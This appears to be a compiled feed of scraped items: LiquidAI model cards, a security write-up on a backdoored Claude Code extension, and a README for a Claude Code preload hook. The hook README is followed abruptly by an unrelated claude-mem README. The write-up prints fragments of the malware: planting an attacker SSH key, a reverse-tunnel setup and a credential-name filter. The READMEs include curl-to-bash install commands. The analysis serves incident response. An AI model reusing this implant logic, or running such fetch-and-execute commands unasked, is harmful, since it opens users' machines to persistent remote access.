models.headline: LFM3-1.7B: a small text model that runs locally on a phone or laptop
models.summary: Squeezed to 4-bit precision, it needs about 1 GB of memory, so it fits on a phone or laptop.
models.why_it_matters: Handy if you want a local agent or tool-calling helper on your own machine, though it is not recommended for agentic coding.
models.for_builders: Load LiquidAI/LFM3-1.7B with Transformers, or pick the GGUF build for Ollama or LM Studio.

extra.author: LiquidAI
extra.source_text:
API Try Docs Blog
# LFM3-1.7B LFM3-1.7B is a **text model for local agents and specialized applications**, based on our new tri-hybrid architecture. - **Agentic training:** post-trained for agentic harnesses such as Hermes Agent, Pi, and OpenClaw, with a 256K-token context window. - **Designed for the edge:** at 4-bit precision, it takes about 1 GB of memory, so it fits on any phone or laptop. - **Made to be specialized:** adapt the model to your domains, formats, and tools via quick single-GPU fine-tuning. Find more information about the LFM3 family in [our release blog post](https://www.liquid.ai/blog/lfm3). ## Model details
The [LFM3 family](https://huggingface.co/collections/LiquidAI/lfm3) includes base, text, vision, audio, omni, and decision models.
Property Specification
Checkpoint Post-trained, text-only language model
Parameters 1.73B
Architecture 24 layers: 13 gated short convolutions, 5 sliding-window attention, 6 global attention
Context length 256K tokens (input + output)
Vocabulary 128,000 tokens
Languages English, Arabic, Chinese, French, German, Italian, Japanese, Korean, Portuguese, Spanish, Vietnamese, Thai, Indonesian, Hindi, Russian, Polish
License LFM Open License v1.0
LFM3-1.7B is designed for local agents, tool calling, structured outputs, and domain-specific fine-tuning. Use retrieval or search for knowledge-heavy tasks. It is not recommended for agentic coding or complex multi-step reasoning due to its small size. ## Inference
Choose a checkpoint variant for your inference framework and hardware.
Checkpoint Framework Description
BF16 vLLM, SGLang, Transformers BF16 weights for GPU inference.
FP8 SGLang FP8 quantization for GPU inference.
NVFP4 SGLang 4-bit floating-point quantization for GPU inference.
GGUF llama.cpp, Ollama, LM Studio Local inference on CPUs and GPUs.
MLX MLX 4-bit quantization for Apple Silicon.
ONNX ONNX Runtime Cross-platform inference with ONNX Runtime.
**Sampling parameters:** - **General** (chat, tool use, agents, coding): `temperature=0.1,top_k=50, repetition_penalty=1.1` - **Math & STEM** (math, science): `temperature=1.0, top_p=0.95, top_k=20` **Transformers quick start:** ```python from transformers import pipeline generator = pipeline( "text-generation", model="LiquidAI/LFM3-1.7B", trust_remote_code=True, ) messages = [{"role": "user", "content": "What is C. elegans?"}] output = generator( messages, do_sample=True, temperature=0.1, top_k=50, repetition_penalty=1.1, max_new_tokens=2048, ) print(output[0]["generated_text"][-1]["content"]) ``` For local agent setup, see the [Agent Harnesses guide](https://docs.liquid.ai/examples/agent-harnesses).
Chat template LFM3 uses this ChatML format, generated from the checkpoint's [chat template](https://huggingface.co/LiquidAI/LFM3-1.7B/blob/main/chat_template.jinja): ```text <|startoftext|><|im_start|>system You are a helpful assistant trained by Liquid AI.<|im_end|> <|im_start|>user Explain how a heat pump works.<|im_end|> <|im_start|>assistant ``` Use `tokenizer.apply_chat_template()` with `add_generation_prompt=True` to format messages automatically. Reasoning is enabled by default. You can set `enable_thinking=False` to disable thinking traces, but this behavior can be inconsistent, especially for reasoning-heavy tasks. Reasoning from turns before the latest user message is removed unless `preserve_thinking=True`.
Tool calling Pass function schemas through `tools=...` to `apply_chat_template()`. The template formats tool definitions and results automatically. Generated calls use XML: ```text Paris ``` Execute the call in your application. Add the parsed assistant call to history as a `tool_calls` entry, then append the result as a `tool` message. Keep passing the tool schemas on subsequent requests and preserve the assistant's content and reasoning from the current tool-use turn. `function.arguments` must be a Python mapping. Decode JSON strings with `json.loads()` before applying the template.
Tool search LFM3 supports deferred tools. Set `defer_loading=True` to keep tool definitions out of the prompt until your harness's search tool returns their names as `tool_reference` parts. The chat template then inserts their definitions into ``. ```python tools = [ search_tool, {"type": "function", "defer_loading": True, "function": get_weather_schema}, ] messages.append({ "role": "tool", "tool_call_id": call_id, "content": [ {"type": "text", "text": "Found 1 tool."}, {"type": "tool_reference", "name": "get_weather"}, ], }) ``` Your harness implements and runs the search. Keep the full `tools` list, including deferred tools, on every request. In the system prompt, tell the model when to search: > You only have one tool right now: search_tools, which searches a catalog of many more tools. If none of your current tools can handle a request, call search_tools to find one, then call the tool it returns. Works with vLLM, SGLang, and LFM3-compatible llama.cpp builds. For llama.cpp, use a GGUF with the current chat template or load it with `--chat-template-file`. See [Deferred tools and tool search](https://docs.liquid.ai/lfm/key-concepts/tool-use) for the full guide.

models.headline: LiquidAI d1-2B answers questions about text, pictures and video in one pass
models.summary: It returns typed answers in about 5.7 ms per decision on an NVIDIA H100, without writing any reply text.
models.why_it_matters: Useful for routing tickets, moderation, and pulling totals and dates out of invoices and forms.
models.for_builders: Run pip install "transformers>=5.19" torch torchvision pillow, then load LiquidAI/d1-2B with AutoModel and trust_remote_code=True.

extra.author: LiquidAI
extra.source_text:
API Try Docs Blog
# d1-2B d1-2B is a **decision model for text, pictures, and video**, built on [LFM3-VL-2B](https://huggingface.co/LiquidAI/LFM3-VL-2B). It returns calibrated answers in one forward pass, without generating tokens. - **Best-in-class:** it leads the open d1 models on average and on our board of over a hundred decision benchmarks, ahead of d1-3B at under two thirds of its size. - **Beyond classification:** it also extracts text, numbers, and dates with their span, locates objects in pictures, and estimates quantities with an interval. - **Millisecond decisions:** 5.7 ms per decision on an NVIDIA H100 and 3.8 ms on an AMD MI325X, with any number of questions about one state in one call. Find more information about open d1 in [our release blog post](https://www.liquid.ai/blog/open-d1). ## Model details
The [LFM3 family](https://huggingface.co/collections/LiquidAI/lfm3) includes base, text, vision, audio, omni, and decision models. d1-2B decides over text, pictures, and video, and [d1-Omni-2B](https://huggingface.co/LiquidAI/d1-Omni-2B) adds audio.
Property Specification
Checkpoint Post-trained decision model, built on LFM3-VL-2B
Parameters 1.92B
Architecture LFM3 backbone, 24 layers: 13 gated short convolutions, 5 sliding-window attention, 6 global attention
Context length 128K tokens
Vocabulary 128,000 tokens
Input A state (text or JSON), pictures or a video, and any number of named questions
Output Typed answers with their probabilities, with no generated tokens
Languages English, Arabic, Chinese, French, German, Italian, Japanese, Korean, Portuguese, Spanish, Vietnamese, Thai, Indonesian, Hindi, Russian, Polish
License LFM Open License v1.0
d1-2B is designed for any pipeline step that needs a decision: routing and triage, moderation and guardrails, intent and topic classification, extraction from documents and forms, judging and reranking, and visual inspection. It is not a chat model. Knowledge-heavy questions favor larger models, and answers get less reliable past about 64K tokens of state. Estimates are reliable on counts and scores, less so on free quantities. ## Inference
d1-2B runs in [Transformers](https://docs.liquid.ai/deployment/gpu-inference/transformers) with its own model code. It reads its answers from a single forward pass, so there are no sampling parameters to set. **Transformers quick start:** ```bash pip install "transformers>=5.19" torch torchvision pillow ``` ```python import torch from transformers import AutoModel device = "cuda" if torch.cuda.is_available() else "mps" if torch.backends.mps.is_available() else "cpu" dtype = torch.float32 if device == "cpu" else torch.bfloat16 model = AutoModel.from_pretrained("LiquidAI/d1-2B", trust_remote_code=True, dtype=dtype).to(device) # Several named questions over one state, answered in one pass questions = { "refund": {"type": "noul", "instructions": "Is the customer asking for a refund?"}, # yes/no: P(yes) "team": {"type": "choice", "instructions": "Which team should handle this?", "criteria": {"billing": "Charges, refunds, invoices", "shipping": "Delivery and parcels", "technical": "App or site faults"}}, "topics": {"type": "choice", "multiple": True, "instructions": "Which topics does the message raise?", "criteria": {"billing": "Payments and charges", "delivery": "Shipping and parcels", "login": "Signing in to the account"}}, "urgency": {"type": "score", "instructions": "How urgent is this ticket?", "criteria": ["low", "medium", "high"]}, } out = model.system_one("I was charged twice and my parcel never arrived. Please refund one charge.", questions) a = out["answers"] urgency = a["urgency"]["legend"][str(int(a["urgency"]["score"]))] print(round(a["refund"]["noul"], 2), a["team"]["choice"], a["topics"]["choices"], urgency) # 1.0 billing ['billing', 'delivery'] medium ```
Values from a document ```python invoice = "ACME SA\nInvoice 2026-117\nTotal due: 1 234,50 EUR\nPay before 03/04/2026 (day/month/year)" out = model.system_one(invoice, { "payee": {"type": "text", "instructions": "Who issued the invoice?"}, "total": {"type": "number", "instructions": "How much is due?"}, "due": {"type": "date", "instructions": "By when must it be paid?"}, "vat": {"type": "number", "instructions": "How much VAT is charged?"}, }) a = out["answers"] print(a["payee"]["text"], a["total"]["number"], a["due"]["date"], a["vat"]["number"]) # ACME SA 1234.5 2026-04-03 None ```
Pictures and boxes Count, locate one object, or list every instance (`max` reads at most that many): ```python from transformers.image_utils import load_image image = load_image("http://images.cocodataset.org/val2017/000000039769.jpg") # two cats on a sofa out = model.system_one(None, { "cats": {"type": "number", "instructions": "How many cats are there?", "range": [0, 10], "step": 1}, "remote": {"type": "box", "instructions": "Where is the remote control on the left?"}, "every_cat": {"type": "boxes", "instructions": "Every cat.", "max": 4}, }, media=[image]) a = out["answers"] print(a["cats"]["number"], a["every_cat"]["count"], {k: round(v, 2) for k, v in a["remote"]["box"].items()}) # 2.0 2 {'top': 0.15, 'bottom': 0.24, 'left': 0.06, 'right': 0.28} ```
Many requests in one call ```python tickets = ["Where is my parcel? It was due Monday.", "The app crashes when I open settings."] for out in model.system_one_batch([(t, {"team": questions["team"]}) for t in tickets]): print(out["answers"]["team"]["choice"]) # shipping # technical ```
Calls
Call What it does
system_one(state, questions, media=None) Named questions over one state, in one pass. media lists pictures (PIL images or {"type": "image", "path": ...}) and videos as their frames ({"type": "video", "video": [PIL images], "fps": 24}).
system_one_batch([(state, questions[, media]), ...]) Many requests in one call, batched.
set_size= (either call) Questions read together after the state. The default is the model's trained size (16). Larger is faster and costs some accuracy on text.
A state is a string, any JSON value, or `None` when the media are the whole state. Each call returns `{"answers": {name: answer}, "usage": {"input_tokens": n, "output_tokens": 0}}`.

extra.candidate_title: Backdoor in Claude Code for VS Code extension on the Cursor Marketplace
extra.source_text: TL;DR Phorion has detected a backdoor in the official Claude Code for VS Code extension bundle on the Cursor Marketplace that drops a persistent SSH backdoor across macOS, Linux, and Windows. This write-up focuses primarily on macOS, where the extension attempts to configure an SSH backdoor and establish persistence. Organisations should immediately review their environments for use of Claude Code for VSCode 2.1.312 or 2.1.313 and engage incident response where use of the extension is discovered. Revision history Initial publication 30 Oct, 05:30 UTC Marketplace correction 30 Oct, 09:13 UTC Corrected the affected marketplace to Cursor. Version-scope update 31 Oct, 00:43 UTC Added 2.1.312 per Cursor’s updated notice . Phorion has discovered a compromise of the official Claude Code for VS Code extension on the Cursor Marketplace, where the backdoored extension bundle contains a persistent Secure Shell (SSH) backdoor. Cursor has removed the affected versions, 2.1.312 and 2.1.313 , from its marketplace. While the implant includes setup and persistence logic for macOS, Linux, and Windows , we’re going to focus primarily on macOS in this post, calling out the key differences and a few implementation bugs on the other platforms along the way. The Cursor Marketplace serves extensions for the Cursor editor. Because extensions run with the permissions of the IDE and the user running it, a backdoored extension gets immediate access to local files, source code, and developer tooling as soon as its module is loaded. Notably, Phorion has discovered a likely oversight in how the malware tries to turn on SSH. The setup logic assumes it can check the current Remote Login state without root privileges. When run as a standard user, systemsetup -getremotelogin prints an administrator-access error and exits with status 0 instead of returning Off . Because the script only tries to enable SSH if the output matches Off , it skips the enablement step entirely. On a Mac that doesn’t already have SSH running, that mistake breaks the inbound access path, even though the SSH keys and persistence still get dropped. In this post, we’ll walk through how the backdoor works, why that macOS check fails, and what to look for across your fleet. The goal of this payload is long-term interactive access, and whilst the SSH backdoor bug minimises impact on macOS, the malware is still a significant threat that installs persistence and beacons host reconnaissance back to the operator. Infection Chain The Cursor Marketplace Extension The compromised extension.js file starts with an injected immediately invoked function expression (IIFE) prepended to the minified extension bundle. The rest of the bundle looks like the standard extension, with Claude Code and VS Code strings, normal activate and deactivate exports, and UI code. The injected prefix pulls in standard Node.js modules ( child_process , fs , os , path , http , and crypto ) and executes as soon as Node loads the file, before the extension’s normal activate callback even runs. The user doesn’t need to interact with the extension for the payload to fire. Stage 1 - Preparing SSH Access First, the payload makes sure ~/.ssh exists and appends an attacker-controlled Ed25519 public key to ~/.ssh/authorized_keys , setting permissions to 0700 on the directory and 0600 on the file. The key uses the comment svc-telemetry . Before appending, the script checks whether svc-telemetry is already in the file rather than checking for the key itself. When hunting for this activity, it’s worth checking the public-key fingerprint rather than relying solely on the comment string. var sd = path.join(HOME, ".ssh" ), ak = path.join(sd, "authorized_keys" ); // ... if (cur.indexOf( "svc-telemetry" ) < 0 ) { fs.appendFileSync(ak, PUB + "\n" ); d.sshKey = "added" } else { d.sshKey = "present" } Here, cur holds the existing contents of authorized_keys , and PUB is the embedded attacker public key (redacted here). With the key in place, anyone holding the matching private key can authenticate as that user, provided SSH is actually running. The next step in the script tries to make sure the local SSH daemon is enabled and listening: Linux: tries to enable and start sshd or ssh via systemctl , falling back to service and /etc/init.d/ . macOS: checks Remote Login and, if it reports Off , tries to enable it via sudo -n systemsetup -setremotelogin on . Windows: tries to install and start OpenSSH Server using PowerShell. None of these steps include a privilege escalation exploit. Non-interactive sudo -n will fail unless the user already has passwordless sudo cached or configured, so starting a system service won’t always succeed from a standard user context. It looks like the Windows code path also has its own bug: it passes the PowerShell service setup command through a helper function ( det() ) that hardcodes /bin/sh , which isn’t going to get very far on a standard Windows install. A bug in the macOS SSH logic? On macOS, the setup may run into problems before it even gets to the sudo command. The script runs systemsetup -getremotelogin without elevation and tests the output against /Off/i . It only tries to enable Remote Login if the output contains Off : // ... else if (PLAT === "darwin" ) { var rl = ex( "systemsetup -getremotelogin 2>/dev/null" , 4000 ); d.remoteLogin = rl; if ( /Off/i .test(rl)) { det( "sudo -n systemsetup -setremotelogin on >/dev/null 2>&1" ); d.remoteLoginOn = "tried" } } Notice that the second command ( -setremotelogin on ) uses sudo -n , while the first command ( -getremotelogin ) doesn’t. When you run systemsetup -getremotelogin as a standard user on macOS, you get this instead: You need administrator access to run this tool... exiting! systemsetup refuses to read the setting without administrator privileges, prints the error to stdout, and exits with status 0 . The malware’s ex() helper grabs stdout and returns it: function ex(c, t) { try { return cp.execSync(c, { timeout : t || 3000 , stdio : [ "ignore" , "pipe" , "ignore" ], windowsHide : true }).toString().trim() } catch (e) { return "" } } Because the output is "You need administrator access to run this tool... exiting!" , /Off/i.test(rl) evaluates to false . As a result, the script skips the if block and never runs sudo -n systemsetup -setremotelogin on . It effectively treats “I don’t have permission to check if SSH is off” as “SSH is already on”, which also explains why you won’t see the enablement attempt in process telemetry when the extension runs as a normal user. This bug can break the final step of the access chain. If Remote Login isn’t already enabled on the Mac, the outbound tunnel can still connect to the attacker’s server, but any traffic forwarded back through the tunnel will hit a closed port 22 on localhost. Of course, that isn’t something to rely on as a defence. If the user already had Remote Login enabled, or turns it on later, the backdoor is ready and waiting. Stage 2 - Establishing the Reverse SSH Tunnel Next, the script sets up an outbound SSH connection to 134.209.82[.]225 as the tunnel user on port 22. To authenticate to the attacker’s server, it decodes a separate embedded private key: an unencrypted OpenSSH Ed25519 key with the comment svc-telemetry-tun . It’s worth keeping the two keys straight during an investigation: The public key added to ~/.ssh/authorized_keys ( svc-telemetry ) lets the attacker log into the victim’s machine. The embedded private key ( svc-telemetry-tun ) lets the victim’s machine connect out to the attacker’s tunnel server. The script writes this tunnel key to the OS temporary directory with a filename starting with .stk_ , followed by the first ten characters of the MD5 hash of the hostname and home directory path: var kf = path.join( TMP, ".stk_" + crypto.createHash( "md5" ) .update( String (os.hostname()) + HOME).digest( "hex" ).slice( 0 , 10 ) ); // ... var RF = (PLAT === "win32" ) ? "\"*:0:localhost:22\"" : "'*:0:localhost:22'" ; The tunnel uses -R *:0:localhost:22 for remote port forwarding. Passing 0 asks the attacker’s SSH server to dynamically allocate a listening port and forward any traffic hitting it back through the tunnel to localhost:22 on the victim’s machine: Affected host -- outbound SSH tunnel --> External SSH server Operator -- separate connection --> Server's allocated port | Through the existing tunnel | v Affected host's SSH:22 | Login using the planted key Because the tunnel runs with -N , it just holds the port forward open without executing a command on the remote server. When the operator wants to access the machine, they start a separate SSH session through the allocated port on their server, authenticating against the victim’s local SSH daemon using the key planted in Stage 1. That gives them a full interactive shell and file transfer capability without needing any custom C2 command handling in the JavaScript itself. The SSH command also passes flags to keep the connection quiet and non-interactive: host-key checking is disabled, known_hosts is ignored, BatchMode and IdentitiesOnly are enabled, keepalives are set to 30 seconds ( ServerAliveCountMax=3 ), and ExitOnForwardFailure is turned on. If autossh is installed, the script uses it; otherwise it falls back to standard ssh . It wraps the connection in a detached retry loop that sleeps for 60 seconds between attempts, using pgrep on Unix systems to avoid spinning up duplicate initial tunnels. Because the loop is detached, the tunnel stays up even after the user closes their IDE. Stage 3 - Keeping Access Available To survive a reboot, the script sets up platform-specific persistence alongside the initial detached tunnel: Platform Artifacts Persistence mechanism Notes Linux ~/.config/.smt , ~/.config/.smtk Writes a shell script that recreates the tunnel key and loops the SSH connection, then adds an @reboot entry to the user’s crontab. Contains a bug in the crontab check that can wipe existing user cron jobs on repeat runs (detailed below). macOS ~/.config/.smt , ~/.config/.smtk , ~/Library/LaunchAgents/com.apple.sysmond.plist Writes a user LaunchAgent that runs /bin/sh ~/.config/.smt with RunAtLoad and KeepAlive set to true , then loads it via launchctl . Runs in the user context rather than as a root LaunchDaemon. Windows ~/.config/smt.cmd , ~/.config/smtk , %APPDATA%/Microsoft/Windows/Start Menu/Programs/Startup/sysmon.cmd Tries to create a scheduled task named SysMon running as SYSTEM on startup. If that fails, drops sysmon.cmd into the user’s Startup folder. Creating a SYSTEM task requires admin privileges; the Startup folder fallback runs as the user at login. On macOS and Linux, the ~/.config/.smt script has the tunnel private key embedded inside it and writes it out to ~/.config/.smtk before starting the reconnection loop. On macOS, the LaunchAgent disguises itself as com.apple.sysmond.plist inside ~/Library/LaunchAgents/ : <key> Label </key> <string> com.apple.sysmond </string> <!-- ... --> <key> RunAtLoad </key> <true/> <key> KeepAlive </key> <true/> Stage 4 - Host Recon Finally, the script gathers basic host reconnaissance and sends a one-off beacon back to the attacker’s server: Hostname, username, OS platform, and architecture Home directory, current working directory, and global Git email ( git config --global user.email ) Public IP address and status flags from each setup stage (e.g. whether the SSH key was added and which persistence method ran) Up to 40 environment variable names (not values) matching /KEY|TOKEN|SECRET|PASS|AWS|GCP/i The environment variable check uses Object.keys(process.env) : Object .keys(process.env) .filter( function (k) { return /KEY|TOKEN|SECRET|PASS|AWS|GCP/i .test(k) }) .slice( 0 , 40 ) Because it only grabs the variable names, the beacon doesn’t exfiltrate the secret values themselves. Instead, it gives the operator a quick inventory of which cloud credentials or API tokens live on the machine so they know which hosts to prioritise. To

extra.candidate_title: Claude Code regularly sends each background agent’s transcript to its model
extra.source_text: Claude Code burns ~15–20% of your tokens on a 3-word status line. Here's how to turn it off by Flamerix AI · MIT License Tested on Linux, Claude Code 2.1.257–2.1.312; macOS reported working by others (see Tested versions). The binary is not modified ( BUN_OPTIONS=--preload ). An update can silently undo it, so see Verify. TL;DR Every ~30 seconds, Claude Code re-sends each background agent's full transcript to the model just to fill that agent's status line in the agents panel. no-agent-summary.js is a Bun --preload that stops that timer without modifying the Claude Code binary. curl -fsSL https://gist.githubusercontent.com/flamerix-ai/c3905705cc4205e5de3011fa2e74efce/raw/no-agent-summary.js -o ~ /.local/share/no-agent-summary.js claude daemon stop --any BUN_OPTIONS= " ${BUN_OPTIONS : + $BUN_OPTIONS } --preload= $HOME /.local/share/no-agent-summary.js " claude To make it permanent for every Claude Code process, see Install . Contents The problem The fix (how it works) Which processes it touches Install Env Nuances Verify (after every update) Fail-open Effect Tested versions Why there is no setting for this Timeline (2026) Changelog License and disclaimer The problem Every ~30 seconds, for every background agent, Claude Code sends that agent's entire transcript to the agent's own model (usually Opus) and asks it to "describe your most recent action in 3-5 words". The answer only updates the agent's status line in the agents panel; it never reaches the model or your conversation. There is no setting that turns it off, and since 2.1.232 (August 2026) it has been on by default. The anomaly was detected by DRIM in Claude Code's OpenTelemetry export: grouping claude_code.api_request events by query_source showed agent_summary costing more than the main conversation itself . query_source = agent_summary week before the hook 2 days after share of all Claude Code spend 16.4 % (main conversation: 15.7 %) 0 % share of all API requests 19.7 % , about 1 in 5 0 % part of that spend on Opus 96 % — input tokens per output token ≈ 9,000 : 1 — Spend here means Claude Code's own per-request estimate ( cost_usd ), not an invoice: on a subscription, what you lose is rate-limit headroom. We are not the only ones who measured it: #86879 collects four independent measurements of 18–26 %. The fix (how it works) no-agent-summary.js is a Bun preload (~70 lines of code). It wraps only the global setTimeout , the one the summary timer is armed through; when a callback's source text contains a summarizer anchor (e.g. the [AgentSummary] Timer fired log line), it returns an inert handle instead of arming the timer. Every other timer passes through untouched. In the OpenTelemetry export the suppressed requests are claude_code.api_request events with query_source = agent_summary . Why a timer hook rather than something simpler: the module ships as precompiled Bun bytecode, so editing its JS text inside the binary changes nothing, and the API client does not go through a wrapped globalThis.fetch . But Function.prototype.toString still returns a callback's source even when it runs from bytecode, so the timer can be recognised by a string inside it. The inert timer uses exactly 2³¹−1 ms: Node and Bun treat a larger delay as 1 ms, so an "infinite" delay would fire at once. Which processes it touches The hook installs only inside Claude Code: Bun.main must be /$bunfs/root/cli (the compiled entry, the same on every row below) and process.execPath must be a Claude Code install. Any other bun , or a compiled Bun binary with another entry name, loads the file and does nothing. install channel (Linux, measured with claude --version ) process.execPath nix …/bin/.claude-wrapped npm @anthropic-ai/claude-code …/@anthropic-ai/claude-code/bin/claude.exe ( .exe on Linux too) npm platform package …/@anthropic-ai/claude-code-linux-x64/claude native installer ~/.local/share/claude/versions/<version> macOS and Windows are not measured; the hook installs there only if they produce these same shapes, and Verify step 1 tells you. One known pass-through: a foreign binary built with bun build --compile --outfile cli and renamed claude ; there, only timers whose callback carries an anchor change. Install Put no-agent-summary.js somewhere stable; note its absolute path. Set BUN_OPTIONS globally so every Claude Code process gets it. Write --preload=<path> , with = : BUN_OPTIONS reaches every bun on the machine, and with a space ( --preload <path> ) bun subcommands break ( bun install → error: Script not found "install" ). Claude Code reads both forms. One of: # ~/.profile, ~/.bashrc, ~/.zshrc export BUN_OPTIONS= " ${BUN_OPTIONS : + $BUN_OPTIONS } --preload=/abs/path/no-agent-summary.js " # ~/.config/fish/config.fish set -gx BUN_OPTIONS " --preload=/abs/path/no-agent-summary.js " # ~/.config/environment.d/50-no-agent-summary.conf (systemd user env; also reaches # user services and timers; applies when the user manager next starts, usually next login) BUN_OPTIONS =-- preload =/abs/path/no-agent-summary.js Or a wrapper named claude earlier on PATH (the case keeps it idempotent when one Claude Code process starts another, and also recognises the v2 space form): #! /bin/sh HOOK=/abs/path/no-agent-summary.js case " ${BUN_OPTIONS-} " in * " --preload= $HOOK " * | * " --preload $HOOK " * ) ;; * ) export BUN_OPTIONS= " ${BUN_OPTIONS : + $BUN_OPTIONS } --preload= $HOOK " ;; esac : " ${CC_AGENT_SUMMARY_LOG := ${XDG_RUNTIME_DIR :-/ tmp} / no-agent-summary.log} " export CC_AGENT_SUMMARY_LOG exec /path/to/the/real/claude " $@ " Restart the daemon and every already-running session, then start Claude Code from an environment that has BUN_OPTIONS : claude daemon stop --any Env variable values effect CC_AGENT_SUMMARY_MODE off (default), pass off suppresses the summary timer. pass is the A/B control: loads and logs, arms every timer untouched. Any other value warns on stderr and acts as off . CC_AGENT_SUMMARY_LOG file path, optional Appends preload active mode=… bun=… hooked=global.setTimeout on load, one line per matched timer (first 20), and an exit count. CC_AGENT_SUMMARY_MARKER file path, optional Overwritten on load with the preload active … line. Nuances Restart the daemon after install. The daemon, pty host and pre-warmed bg-spare sessions inherit the environment of the client that started the daemon, so a daemon started before BUN_OPTIONS was set keeps spawning unhooked sessions. Hence claude daemon stop --any . Headless runs need it too: claude -p , cron, CI, editor integrations. Platform: Linux tested by us, macOS (darwin-arm64) reported working by others, Windows untested (see Which processes it touches ). npm --ignore-scripts : bin/claude stays a shell stub and Bun never starts, so the hook never runs. Upgrading from v2: overwrite the file in place, switch BUN_OPTIONS to the = form and restart the daemon. If both forms name the same path, bun loads it once. Two different paths (say an old copy kept beside the new one) both load: a second v3 copy is a no-op, but v2 has no such guard, so do not leave a v2 path in BUN_OPTIONS . A/B: CC_AGENT_SUMMARY_MODE=pass loads the hook but arms every timer; the summaries come back, which shows the off result is the hook's doing. Background processes: daemon, pty host and bg-spare must carry --preload in their environment ( /proc/<pid>/environ on Linux); if not, restart the daemon. Verify (after every update) Preload loads: BUN_OPTIONS= " --preload= $HOME /.local/share/no-agent-summary.js " CC_AGENT_SUMMARY_LOG=/tmp/nas.log claude --version && cat /tmp/nas.log Expect preload active mode=off … . No line: BUN_OPTIONS did not reach the process, or the path is not absolute. Timer suppressed: with the same BUN_OPTIONS and CC_AGENT_SUMMARY_LOG=/tmp/nas.log , run a background subagent for a minute or two. The log shows summary timer #1 suppressed (setTimeout, delay=30000) and the agent's panel status stops updating. If you export OpenTelemetry, query_source = agent_summary should stay at zero; this is the only check that catches every failure mode. Fail-open Matching is by source text : an anchor must sit inside the callback passed to the timer. If an update breaks that, the hook matches nothing and summaries silently come back. Ways it can happen: the log line or query-source id is renamed; the callback is passed via fn.bind(...) (no source in toString ) or another wrapper; the strings move to a shared constant outside the callback; the timer moves off the global setTimeout ( setInterval , require("timers") , timers/promises , a scheduler loop). So re-run Verify after every update. Effect We run it under every Claude Code process on our machine (2.1.301). Since then there have been zero agent_summary requests, and no other side query grew to take its place. Subagents, background agents, forked skills and background sessions run normally; only the summary fork is skipped. Visible change: the per-agent panel status stops updating; SDK task_progress has no summary . Overhead: one Function.prototype.toString per distinct timer callback, cached in a WeakMap . claude --version : ~10 ms → ~17 ms (one measurement). Tested versions Linux x64 binary from npm @anthropic-ai/claude-code-linux-x64 (its sha256 equals the native installer's manifest.json checksum). Static: the extracted bundle's summary timer callback carries a hook anchor. Live: claude -p --model haiku with CLAUDE_CODE_AGENT_PROGRESS_SUMMARIES=1 , one subagent doing 8 steps of ~20 s, counting [AgentSummary] Forking in --debug-file . The two v3 rows are this script, re-run on 2026-10-29. Claude-Mem seamlessly preserves context across sessions by automatically capturing tool usage observations, generating semantic summaries, and making them available to future sessions. This enables Claude to maintain continuity of knowledge about projects even after sessions end or reconnect.

--- ## Quick Start Install claude-mem for Grok Bot: ```bash npx claude-mem install --ide grok-bot ``` Grok Bot has no host hooks, so we watch the chat log files. Default is CMEM Pro, the hosted memory. Local observer is opt-in: `--provider host`. Installing this plugin does not install Cursor. **Awareness push pilot (LFG + Orifice):** needle observations (`decision`, `bugfix`, `security_alert`, `sensitive`) are appended as dated `- YYYY-MM-DD [awareness] …` lines into that bot's `memory/log/YYYY-MM.md`. Grok Bot already re-reads the log from disk. This does not write `profile.md`, user-memory, or project memory. Disable with `CLAUDE_MEM_GROK_BOT_AWARENESS_ENABLED=false`. Install with a single command: ```bash npx claude-mem install ``` The installer sets everything up first, then asks you to sign in to claude-mem in your browser (email magic link — no card required). Signing in provisions a memory key for your account and unlocks the **claude-mem observer** with a **30 Day Free Trial**: memory runs off-plan, so you get up to 100% more usage from your plan. When the free trial ends, memory automatically falls back to your Anthropic plan unless you subscribe. After sign-in you pick your memory provider — the claude-mem observer, your own OpenRouter or Gemini key, or your Anthropic plan. Prefer to skip the sign-in? Pass an explicit `--provider` flag, set `CLAUDE_MEM_ONLINE_OPTIN=false`, or run in CI/non-interactive shells — the installer completes without any account interaction. Or install for OpenCode: ```bash npx claude-mem install --ide opencode ``` This works with OpenCode 1.3.4 or later, including OpenCode 2. Restart OpenCode after installing. Or install for **T3 Code** (Codex and Claude Code providers): ```bash npx claude-mem install --ide t3code ``` The installer discovers T3 Code's enabled providers, registers native Claude-Mem plugins in their configured homes, and supports T3-managed Codex. Restart T3 Code, trust the provider's hooks when prompted, and start a new thread. See the [T3 Code integration guide](https://docs.claude-mem.ai/t3code-integration) for custom server settings, status, and removal. Or install for Antigravity CLI ([setup guide](https://docs.claude-mem.ai/antigravity-cli/setup)): ```bash npx claude-mem install --ide antigravity ``` Or install for OMP (Oh My Pi): ```bash npx claude-mem install --ide omp ``` Or install the native Pi extension or DeepSeek Harness plugin: ```bash npx claude-mem install --ide pi npx claude-mem install --ide dsh --dsh-profile tui ``` Pi and DeepSeek Harness use the worker runtime. See [native harness setup](docs/native-harness-integrations.md) for capture, recall, and troubleshooting. Or install from the plugin marketplace inside Claude Code: ```bash /plugin marketplace add thedotmack/claude-mem /plugin install claude-mem ``` Restart Claude Code. Context from previous sessions will automatically appear in new sessions. > **Note:** Claude-Mem is also published on npm, but `npm install -g claude-mem` installs the **SDK/library only** — it does not register the plugin hooks or set up the worker service. Always install via `npx claude-mem install` or the `/plugin` commands above. ### 🦞 OpenClaw Gateway Install claude-mem as a persistent memory plugin on [OpenClaw](https://openclaw.ai) gateways with a single command: ```bash curl -fsSL https://install.cmem.ai/openclaw.sh | bash ``` The installer handles dependencies, plugin setup, AI provider configuration, worker startup, and optional real-time observation feeds to Telegram, Discord, Slack, and more. See the [OpenClaw Integration Guide](https://docs.claude-mem.ai/openclaw-integration) for details. **Key Features:** - 🧠 **Persistent Memory** - Context survives across sessions - 📊 **Progressive Disclosure** - Layered memory retrieval with token cost visibility - 🔍 **Smart Search (Default)** - Query your project history with the three-step mem-search skill - 🖥️ **Local My Work** - Live requests, progress, human handoffs and a saved review queue at the worker URL printed on startup. [Guide](https://docs.claude-mem.ai/usage/my-work). Memory, sessions and settings remain at `/viewer`. - 👥 **TeamBrain** - An optional shared workspace beside My Work, with real team work lists, member attribution and linked findings. Each person chooses what to share; personal requests and review notes stay separate. [Set up a team](https://cmem.ai/teambrain/start). - 💻 **Claude Desktop Skill** - Search memory from Claude Desktop conversations - 🔒 **Privacy Control** - Use `` tags to exclude sensitive content from storage - 🖼️ **Screenshots (opt-in, off by default)** - Keep converted copies of tool screenshots under `~/.claude-mem/media-v1/`, upload them to cmem.ai only when Cloud Sync is on, and send them to the observer model only when image inference is separately enabled ([details](https://docs.claude-mem.ai/configuration#screenshots-and-images-opt-in)) - 